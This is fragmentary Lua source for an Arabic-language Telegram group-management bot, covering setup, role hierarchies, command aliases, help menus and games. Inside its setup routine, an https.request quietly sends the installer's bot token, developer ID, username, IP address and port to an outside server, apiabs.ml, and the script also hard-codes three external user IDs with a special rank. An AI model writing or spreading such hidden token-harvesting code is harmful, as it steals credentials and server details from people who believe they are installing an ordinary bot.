...
if not DevAbs:get(Server.."IdSURSBER") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevAbs:set(Server.."IdSURSBER",DevId) 
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end 
os.execute('lua SURSBER.lua') 
end 
if not DevAbs:get(Server.."TokenSURSBER") then 
...
DevAbs:set(Server.."TokenSURSBER",TokenBot) 
end  
else 
...
Config = {
DevId = DevAbs:get(Server.."IdSURSBER"),
TokenBot = DevAbs:get(Server.."TokenSURSBER"),
SURSBER = DevAbs:get(Server.."TokenSURSBER"):match("(%d+)"),
SudoIds = {DevAbs:get(Server.."IdSURSBER")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/config.php?Get=SURSBER&DevId="..DevAbs:get(Server.."IdSURSBER").."&TokenBot="..DevAbs:get(Server.."TokenSURSBER").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("SURSBER.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/SURSBER
token="]]..DevAbs:get(Server.."TokenSURSBER")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
...
f:close() 
DevAbs:del(Server.."IdSURSBER");DevAbs:del(Server.."TokenSURSBER")
end 
...
NameBot = (DevAbs:get(SURSBER..'Abs:NameBot') or 'بروكس')
--     Source SURSBER     --
...
local Status = DevAbs:sismember(SURSBER..'Abs:SecondSudo:',msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:SudoBot:',msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:ManagerAll:',msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:AdminAll:',msg.sender_user_id_) 
...
------ Vip Member All ------
function VipAll(msg) 
local Status = DevAbs:sismember(SURSBER..'Abs:VipAll:',msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:AbsConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
local Status = DevAbs:sismember(SURSBER..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevAbs:sismember(SURSBER..'Abs:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevAbs:sismember(SURSBER..'Abs:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevAbs:sismember(SURSBER..'Abs:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
if DevAbs:sismember(SURSBER..'Abs:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevAbs:sismember(SURSBER..'Abs:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevAbs:sismember(SURSBER..'Abs:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevAbs:sismember(SURSBER..'Abs:MuteAll:', user_id) then
var = true
else
var = false
end
...
vardump(JsonInfo)
DevAbs:set(SURSBER.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevAbs:sadd(SURSBER.."Rio:Groups",IdGps) 
DevAbs:set(SURSBER.."Rio:Lock:Bots"..IdGps,"del") DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevAbs:set(SURSBER..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevAbs:sadd(SURSBER..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevAbs:sadd(SURSBER..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevAbs:sadd(SURSBER..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevAbs:sadd(SURSBER..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevAbs:sadd(SURSBER..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevAbs:sadd(SURSBER..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevAbs:set(SURSBER.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevAbs:set(SURSBER.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then SURSBERTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1750071859) then SURSBERTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1516553352) then SURSBERTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(SURSBER) then SURSBERTeam = 'البوت' elseif SudoId(user_id) then SURSBERTeam = 'المطور الاساسي' elseif DevAbs:sismember(SURSBER..'Rio:RioSudo:', user_id) then SURSBERTeam = 'المطور الاساسي' elseif DevAbs:sismember(SURSBER..'Rio:SecondSudo:', user_id) then SURSBERTeam = 'المطور الاساسي²' elseif DevAbs:sismember(SURSBER..'Rio:SudoBot:', user_id) then SURSBERTeam = DevAbs:get(SURSBER.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(SURSBER..'Rio:RioConstructor:'..chat_id, user_id) then SURSBERTeam = 'المالك' elseif DevAbs:sismember(SURSBER..'Rio:Owner:', user_id) then SURSBERTeam = 'المالك' elseif DevAbs:sismember(SURSBER..'Rio:BasicConstructor:'..chat_id, user_id) then SURSBERTeam = DevAbs:get(SURSBER.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(SURSBER..'Rio:Constructor:'..chat_id, user_id) then SURSBERTeam = DevAbs:get(SURSBER.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(SURSBER..'Rio:Managers:'..chat_id, user_id) then SURSBERTeam = DevAbs:get(SURSBER.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(SURSBER..'Rio:Admins:'..chat_id, user_id) then SURSBERTeam = DevAbs:get(SURSBER.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(SURSBER..'Rio:VipMem:'..chat_id, user_id) then  SURSBERTeam = DevAbs:get(SURSBER.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(SURSBER..'Rio:Cleaner:'..chat_id, user_id) then  SURSBERTeam = DevAbs:get(SURSBER.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else SURSBERTeam = DevAbs:get(SURSBER.."Rio:mem:Rd"..chat_id) or 'العضو' end return SURSBERTeam end
--     Source SURSBER     --
...
var = true
elseif DevAbs:sismember(SURSBER..'Rio:RioSudo:', user_id) then
var = true
elseif DevAbs:sismember(SURSBER..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevAbs:sismember(SURSBER..'Rio:SudoBot:', user_id) then
var = true 
elseif DevAbs:sismember(SURSBER..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(SURSBER..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(SURSBER..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(SURSBER..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(SURSBER..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(SURSBER..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(SURSBER..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
--     Source SURSBER     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(SURSBER..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source SURSBER     --
...
local var = true 
if DevAbs:get(SURSBER.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevAbs:get(SURSBER..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbs:get(SURSBER..'Rio:ChText') then
local ChText = DevAbs:get(SURSBER..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbs:get(SURSBER.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevAbs:get(SURSBER..'yes'..data.sender_user_id_) == 'delyes' then
DevAbs:del(SURSBER..'yes'..data.sender_user_id_, 'delyes')
DevAbs:del(SURSBER..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevAbs:get(SURSBER..'no'..data.sender_user_id_) == 'delno' then
DevAbs:del(SURSBER..'yes'..data.sender_user_id_, 'delyes')
DevAbs:del(SURSBER..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source SURSBER     --
if DataText == '/yesdel' and DevAbs:get(SURSBER..'yesdel'..data.sender_user_id_) == 'delyes' then
DevAbs:del(SURSBER..'yesdel'..data.sender_user_id_, 'delyes')
DevAbs:del(SURSBER..'nodel'..data.sender_user_id_, 'delno')
if DevAbs:sismember(SURSBER..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(SURSBER..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevAbs:sismember(SURSBER..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(SURSBER..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(SURSBER..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevAbs:sismember(SURSBER..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevAbs:sismember(SURSBER..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(SURSBER..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(SURSBER..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(SURSBER..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(SURSBER..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(SURSBER..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevAbs:srem(SURSBER..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(SURSBER..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(SURSBER..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
if DevAbs:get(SURSBER.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevAbs:del(SURSBER.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevAbs:get(SURSBER.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevAbs:get(SURSBER..'nodel'..data.sender_user_id_) == 'delno' then
DevAbs:del(SURSBER..'yesdel'..data.sender_user_id_, 'delyes')
DevAbs:del(SURSBER..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevAbs:get(SURSBER.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevAbs:smembers(SURSBER..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevAbs:incrby(SURSBER..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevAbs:del(SURSBER..'Rio:ListRolet'..data.chat_id_) 
DevAbs:del(SURSBER.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevAbs:del(SURSBER..'Rio:ListRolet'..data.chat_id_) 
DevAbs:del(SURSBER.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevAbs:del(SURSBER.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevAbs:sismember(SURSBER..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(SURSBER..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DevAbs:del(SURSBER..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevAbs:srem(SURSBER..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevAbs:smembers(SURSBER..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevAbs:get(SURSBER..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevAbs:del(SURSBER..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevAbs:del(SURSBER..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevAbs:del(SURSBER..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevAbs:srem(SURSBER..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevAbs:get(SURSBER..'Rio:Help')
local Text = [[
...
local Help = DevAbs:get(SURSBER..'Rio:Help1')
local Text = [[
...
local Help = DevAbs:get(SURSBER..'Rio:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
...
local Help = DevAbs:get(SURSBER..'Rio:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
...
local Help = DevAbs:get(SURSBER..'Rio:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
...
local Help = DevAbs:get(SURSBER..'Rio:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevAbs:get(SURSBER..'Rio:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevAbs:get(SURSBER.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(SURSBER.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevAbs:del(SURSBER.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevAbs:get(SURSBER..'Rio:NameBot') or "ديفد")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbs:get(SURSBER..'Rio:NameBot') or "ديفد")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevAbs:get(SURSBER.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(SURSBER.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevAbs:del(SURSBER.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(SURSBER.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(SURSBER.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(SURSBER.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevAbs:del(SURSBER.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevAbs:smembers(SURSBER.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevAbs:get(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevAbs:smembers(SURSBER.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevAbs:del(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(SURSBER.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevAbs:set(SURSBER.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevAbs:sadd(SURSBER.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
DevAbs:set(SURSBER.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevAbs:set(SURSBER.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevAbs:smembers(SURSBER.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevAbs:get(SURSBER.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevAbs:smembers(SURSBER.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevAbs:del(SURSBER.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevAbs:del(SURSBER.."Coomds"..msg.chat_id_)
end
...
DevAbs:set(SURSBER.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(SURSBER.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(SURSBER.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAbs:del(SURSBER.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevAbs:get(SURSBER.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevAbs:del(SURSBER.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevAbs:get(SURSBER.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(SURSBER.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevAbs:sismember(SURSBER.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevAbs:get(SURSBER.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
...
DevAbs:set(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevAbs:sadd(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevAbs:set(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevAbs:sadd(SURSBER..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevAbs:set(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevAbs:sadd(SURSBER..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevAbs:srem(SURSBER..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevAbs:srem(SURSBER..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevAbs:srem(SURSBER..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(SURSBER.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
